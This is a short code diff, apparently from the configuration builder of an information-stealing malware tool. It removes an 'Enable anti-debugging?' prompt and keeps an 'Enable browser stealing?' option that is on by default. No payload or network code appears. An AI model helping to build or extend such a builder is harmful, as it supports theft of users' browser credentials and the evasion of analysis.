@@ -19,12 +19,6 @@ class Config:
             },
             {
                 "type": "confirm",
-                "name": "antidebug",
-                "message": "Enable anti-debugging?",
-                "default": True,
-            },
-            {
-                "type": "confirm",
                 "name": "browsers",
                 "message": "Enable browser stealing?",
                 "default": True,
